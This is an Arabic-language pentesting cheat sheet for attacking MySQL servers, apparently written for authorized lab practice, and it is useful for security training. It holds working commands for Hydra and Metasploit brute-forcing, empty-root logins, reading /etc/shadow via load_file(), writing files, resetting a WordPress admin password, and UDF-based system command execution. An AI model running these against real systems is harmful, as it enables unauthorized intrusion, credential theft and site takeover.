1. Reconnaissance

تأكد من عنوانك ووصول الهدف قبل فحص قاعدة البيانات.

معرفة عنوانك والواجهة KALI TERMINAL
ip a ifconfig
اختبار الوصول KALI TERMINAL
ping -c 4 [TARGET]
إذا ICMP محجوب، انتقل إلى Nmap واستخدم -Pn عند الحاجة.
اكتشاف الأجهزة عند الحاجة KALI TERMINAL
nmap -sn [SUBNET]

2. Port Scanning

حدد هل MySQL مكشوف وما الإصدار الذي يرد على الشبكة.

فحص البورت والإصدار KALI TERMINAL
nmap -p3306 -sV [TARGET]
3306/tcp open mysql
فحص MySQL scripts الأساسية KALI TERMINAL
nmap -p3306 --script mysql-info [TARGET]
فحص شامل إذا لم يظهر على 3306 KALI TERMINAL
nmap -p- -sV [TARGET]

3. Enumeration

اجمع الإصدار والمعلومات المتاحة قبل تجربة كلمات المرور.

Version / Information

MySQL version عبر Metasploit MSFCONSOLE
use auxiliary/scanner/mysql/mysql_version set RHOSTS [TARGET] run
Enumeration عبر Nmap NSE KALI TERMINAL
nmap -p3306 --script mysql-info,mysql-enum [TARGET]

بعد الحصول على Credentials

الدخول يدويًا KALI TERMINAL
mysql -h [TARGET] -u [USERNAME] -p
أدخل كلمة المرور عند الطلب بدل وضعها مباشرة في سطر الأوامر.
معرفة المستخدم والإصدار MYSQL CLIENT
SELECT USER(); SELECT CURRENT_USER(); SELECT VERSION();
عرض قواعد البيانات MYSQL CLIENT
SHOW DATABASES;
اختيار قاعدة وعرض الجداول MYSQL CLIENT
USE [DATABASE]; SHOW TABLES;
معرفة الأعمدة ثم قراءة البيانات المطلوبة MYSQL CLIENT
DESCRIBE [TABLE]; SELECT * FROM [TABLE];
فحص صلاحيات الحساب الحالي MYSQL CLIENT
SHOW GRANTS; SHOW GRANTS FOR CURRENT_USER;
الصلاحيات هي التي تحدد المسار التالي؛ لا تفترض أن حساب MySQL يعني وصولًا للنظام.
تعداد المستخدمين وقواعد البيانات (بيانات فارغة/افتراضية) KALI TERMINAL
nmap -p3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" [TARGET] nmap -p3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" [TARGET]
فحص مسار تخزين البيانات KALI TERMINAL
nmap -p3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" [TARGET]
فحص صلاحية منح ملفات (File Privileges) KALI TERMINAL
nmap -p3306 --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" [TARGET]
استعلام مباشر عبر NSE (بدون فتح جلسة يدوية) KALI TERMINAL
nmap -p3306 --script=mysql-query --script-args="query='select count(*) from [DATABASE].[TABLE];',username='root',password=''" [TARGET]
Test Root Login Without Password KALI TERMINAL
mysql -h [TARGET] -u root
أوامر داخل جلسة MySQL MYSQL PROMPT
show databases; use [DATABASE]; show tables; select count(*) from [TABLE]; select load_file("/etc/shadow");
صلاحية FILE تتيح قراءة ملفات النظام مباشرة عبر load_file()

4. Credential Testing

اختبر الحسابات المكتشفة بأكثر من طريقة ثم أكد النجاح بعميل MySQL.

Password testing عبر Hydra KALI TERMINAL
hydra -l [USERNAME] -P [WORDLIST] [TARGET] mysql
Password testing عبر Metasploit MSFCONSOLE
use auxiliary/scanner/mysql/mysql_login set RHOSTS [TARGET] set USERNAME [USERNAME] set PASS_FILE [WORDLIST] run
اختبار Root بدون كلمة مرور KALI TERMINAL
mysql -h [TARGET] -u root
جرّب الحسابات الفارغة أو الافتراضية فقط داخل اللاب المصرح؛ لا تعتبر وجود root دليلًا على أن كلمة المرور فارغة.
تأكيد Credentials الناجحة KALI TERMINAL
mysql -h [TARGET] -u [USERNAME] -p
Brute-force عبر Hydra KALI TERMINAL
hydra -l [USER] -P [WORDLIST] [TARGET] mysql
Brute-force عبر Metasploit MSFCONSOLE
use auxiliary/scanner/mysql/mysql_login set RHOSTS [TARGET] set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt run

5. Exploitation

استفد من صلاحيات MySQL الفعلية فقط؛ لا تستخدم exploit أو file operation بدون تحقق.

تحذير: تأكد من Service وVersion وOS والصلاحيات والـpreconditions قبل أي exploit أو محاولة كتابة ملف.

Database Access

البحث عن حسابات MySQL MYSQL CLIENT
SELECT User,Host FROM mysql.user;
قد يحتاج الحساب الحالي صلاحية لقراءة mysql.user.
قراءة ملف عبر LOAD_FILE عند توفر الصلاحية MYSQL CLIENT
SELECT LOAD_FILE('[FILE]');
يعتمد على FILE privilege وإعدادات الخادم وصلاحيات نظام التشغيل.
فحص قيود كتابة الملفات MYSQL CLIENT
SHOW VARIABLES LIKE 'secure_file_priv';
كتابة ملف عند تحقق الصلاحيات والمسار MYSQL CLIENT
SELECT 'test' INTO OUTFILE '[FILE]';
لا تستخدم OUTFILE إلا بعد التأكد من FILE privilege والمسار المسموح وأن الكتابة جزء من اللاب.

Metasploit

Enumeration للحسابات الموثقة MSFCONSOLE
use auxiliary/admin/mysql/mysql_enum set RHOSTS [TARGET] set USERNAME [USERNAME] set PASSWORD [PASSWORD] run
تشغيل SQL query عبر Metasploit MSFCONSOLE
use auxiliary/admin/mysql/mysql_sql set RHOSTS [TARGET] set USERNAME [USERNAME] set PASSWORD [PASSWORD] set SQL "SELECT VERSION()" run
إذا كانت المشكلة مجرد Credentials ضعيفة، فالـlogin نفسه هو نقطة الوصول. لا تضف CVE عشوائي لمجرد أن 3306 مفتوح.
سيناريو كامل — تغيير باسورد لوحة WordPress عبر MySQL MYSQL PROMPT
mysql -u root -p -h [TARGET] use [WP_DATABASE]; show tables; select * from [WP_PREFIX]_users; UPDATE [WP_PREFIX]_users SET user_pass = MD5('[NEW_PASSWORD]') WHERE user_login = '[WP_ADMIN_USER]';
✓ بعد نجاح التحديث، تحقّق من بيانات الدخول عبر صفحة WordPress login المناسبة لمسار التثبيت
استبدل [WP_DATABASE] و[WP_PREFIX] و[WP_ADMIN_USER] بالقيم الفعلية المكتشفة داخل اللاب.
هذا مسار كامل مستقل من Recon إلى Access — تغيير باسورد قاعدة بيانات يعطيك دخول لوحة تحكم كاملة بدون أي exploit إضافي
تنفيذ أوامر نظام عبر UDF (رفع صلاحية SQL إلى تنفيذ أوامر) MSFCONSOLE
use exploit/multi/mysql/mysql_udf_payload set RHOST [TARGET] set USERNAME [USER] set PASSWORD [PASS] set FORCE_UDF_UPLOAD true set target 1 # 1 = Linux exploit
FORCE_UDF_UPLOAD true يثبت دالة sys_exec() تتيح لك تنفيذ أوامر نظام مباشرة من داخل SQL

6. Post-Exploitation

بعد نجاح الدخول، احفظ المعلومات المهمة وحدد هل الصلاحيات تفتح مسارًا آخر.

تأكيد هوية حساب قاعدة البيانات MYSQL CLIENT
SELECT USER(); SELECT CURRENT_USER(); SHOW GRANTS;
تحديد قواعد البيانات المهمة MYSQL CLIENT
SHOW DATABASES;
فحص متغيرات مهمة للسياق MYSQL CLIENT
SHOW VARIABLES LIKE 'version%'; SHOW VARIABLES LIKE 'plugin_dir'; SHOW VARIABLES LIKE 'secure_file_priv';
إذا حصلت على shell للنظام من مسار آخر، انتقل إلى مرجع Post-Exploitation العام. لا تكرر Meterpreter أو Privilege Escalation الكامل داخل ملف MySQL.
